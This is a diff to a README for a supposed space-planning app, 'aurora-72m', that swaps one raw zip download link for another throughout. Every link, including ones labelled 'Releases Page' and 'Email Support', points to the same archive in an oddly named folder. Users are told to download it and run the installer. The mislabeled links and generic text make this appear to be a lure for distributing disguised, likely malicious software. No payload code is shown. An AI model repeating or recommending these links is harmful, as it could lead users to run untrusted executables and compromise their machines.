@@ -1,7 +1,7 @@
 # 🌌 aurora-72m - Simplifying Your Space Planning
 
 ## 📥 Download Now
-[![Download aurora-72m](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip)](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip)
+[![Download aurora-72m](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip)](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to aurora-72m! This application helps you manage your space with ease. Whether you're planning a new room layout or rethinking your office setup, this software provides user-friendly tools to visualize and organize your space effectively.
@@ -11,7 +11,7 @@ To get started, you need to download the software. Follow these simple steps:
 
 1. **Visit the Releases Page**
    Click the link below to go to the releases page where you can find the latest version and other versions available.
-   [Download from Releases](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip)
+   [Download from Releases](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will see a list of available versions. Look for the latest one (usually at the top) and click on it.
@@ -20,7 +20,7 @@ To get started, you need to download the software. Follow these simple steps:
    Download the file marked for your operating system. The common formats include:
    - Windows: `.exe`
    - Mac: `.dmg`
-   - Linux: `.deb` or `https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip`
+   - Linux: `.deb` or `https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip`
 
 4. **Run the Installer**
    Once the file is downloaded, locate it in your downloads folder and double-click to run. Follow the prompts to install the software.
@@ -46,7 +46,7 @@ Before installation, ensure your computer meets these requirements:
 ## 📢 Support
 If you encounter any issues or have questions, help is available. 
 
-- **Email Support**: If you need assistance, feel free to reach out via email: https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip
+- **Email Support**: If you need assistance, feel free to reach out via email: https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip
 - **FAQ**: Check our Frequently Asked Questions section on the releases page for common issues and solutions.
 
 ## 📌 Additional Tips
@@ -56,4 +56,4 @@ If you encounter any issues or have questions, help is available.
 Thank you for choosing aurora-72m. Enjoy your journey of simple and effective space planning! 
 
 ## 🗂️ Links
-- **Releases Page**: [Download from Releases](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/aurora-72m.zip)
+- **Releases Page**: [Download from Releases](https://raw.githubusercontent.com/gdyqgdiqe/aurora-72m/main/Pehuenche/m-aurora-2.5.zip)
